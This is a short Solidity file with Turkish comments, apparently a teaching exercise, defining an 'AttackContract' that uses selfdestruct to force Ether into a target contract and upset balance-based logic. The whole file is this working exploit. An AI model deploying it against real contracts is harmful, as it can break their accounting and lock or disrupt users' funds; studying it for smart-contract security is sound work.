// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// VictimContract'ı import ediyoruz
import "./VictimContract.sol"; // Bu dosyanın doğru yolu verilmeli

// Saldırı kontratı tanımı
contract AttackContract {
    // Hedef kontratın adresini tutan durum değişkeni
    address payable public victim;

    /**
     * @dev Constructor, hedef kontratın adresini alır ve kaydeder.
     * @param _victim Ether göndermek istenen hedef kontrat adresi.
     */
    constructor(address payable _victim) {
        victim = _victim; // Hedef kontrat adresi kaydedilir
    }

    /**
     * @dev Hedef kontrata selfdestruct kullanarak Ether gönderir.
     * Kullanıcıdan Ether alır ve tüm kontrat bakiyesini hedef kontrata transfer eder.
     *
     * - msg.value: Kullanıcı tarafından gönderilen Ether miktarı.
     * - selfdestruct: Kontratı imha eder ve kalan tüm Ether'i hedef adrese gönderir.
     *
     * İşlemin gerçekleştirilmesi için `msg.value > 0` kontrolü yapılır.
     * Aksi durumda işlem başarısız olur.
     */
    function attack() external payable {
        require(msg.value > 0, "Send some Ether to perform the attack"); // Gönderilen Ether miktarı sıfır olmamalı
        selfdestruct(victim); // Kontrat imha edilir ve Ether hedef kontrata gönderilir
    }
}
